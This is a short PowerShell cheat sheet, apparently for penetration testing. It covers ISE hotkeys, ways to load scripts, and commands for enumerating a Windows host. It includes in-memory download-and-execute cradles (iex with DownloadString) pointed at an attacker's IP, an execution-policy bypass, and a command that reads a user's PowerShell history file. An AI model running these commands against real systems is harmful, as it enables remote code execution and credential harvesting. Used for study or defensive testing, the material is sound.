# Powershell

## ISE Hotkeys

- Switch to console pane: `Ctrl + d`
- Switch to scripting pane: `Ctrl + i`

## Fundamentals

Load PowerShell scripts via the following methods:

```powershell
# Local dot-source
. .\$SCRIPT

# Local import module
Import-Module .\$SCRIPT

# Remotely
iex(new-object net.webclient).downloadstring("http://$OUR_IP:$PORT/$SCRIPT")
```

- Dot-sourcing loads powershell scripts into the **current scope**. Stealthier but can break for functions with overlapping names.
- `Import-Module` loads powershell scripts, but executes them in their own scope.

## Capabilities

```powershell
# Print system information
systeminfo

# Print hostname
hostname

# Print OS version
[System.Environment]::OSVersion.Version

# Print patches/hotfixes on the host
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Print network configurations
ipconfig /all
arp -a
route print

# List available modules
Get-Module

# Print execution policy
Get-ExecutionPolicy -List

# Change the execution policy in our current process
Set-ExecutionPolicy Bypass -Scope Process

# Check history
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Check environment variables
Get-ChildItem Env: | ft Key,Value

# Download a powershell script and execute it in memory
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"

# Check firewall
netsh advfirewall show allprofiles

# Check defender
Get-MpComputerStatus

# Check for other sessions
qwinsta

# Check module for available commands
Get-Command -Module Defender

# Stop process
Stop-Process -Id $PID
Stop-Process -Name $PROC_NAME
```
